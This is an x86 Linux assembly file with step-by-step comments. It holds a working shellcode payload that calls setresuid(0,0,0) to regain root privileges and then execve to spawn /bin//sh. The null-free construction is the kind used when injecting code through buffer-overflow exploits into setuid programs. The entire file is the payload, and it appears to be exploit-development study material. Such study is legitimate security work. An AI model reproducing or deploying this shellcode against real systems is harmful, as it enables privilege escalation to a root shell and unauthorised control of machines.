;one of the most to set the privilege for root is setresuid() function which has sys call of 164 

BITS 32

section .text

global _start

_start:
			;ebx 		ecx 		edx 		
;setresuid(uid_t ruid, uid_t ruid, eid_t suid)
xor eax, eax ; zero out eax rigister
xor ebx, ebx ; zero out ebx rigister
xor ecx, ecx ; zero out ecx rigister
xor edx, edx ; zero out edx rigister
mov al, 0xa4 ; mov the syscall setresuid of this byte to the lower byte part of eax 
int 0x80 ; call ;setresuid(0, 0, 0)

;execve(const char *filename,  char *const argv[], char *const envp[])
xor eax, eax ; zero out eax rigister
mov al, 11; syscall execve 
push ecx ; for null termination 
push 0x68732f2f; push "//sh" 
push 0x6e69622f; push "/bin" 
mov ebx, esp ; the ebx now points to /bin//sh
push ecx; for null termination 
mov edx, esp ; the edx now points to null termination [the usage here for en empty array]
push ebx; push the string address above the null termination 
mov ecx, esp ; this argv array with string pointer 
int 0x80; ;execve(/bin//sh, [/bin//sh], [NULL])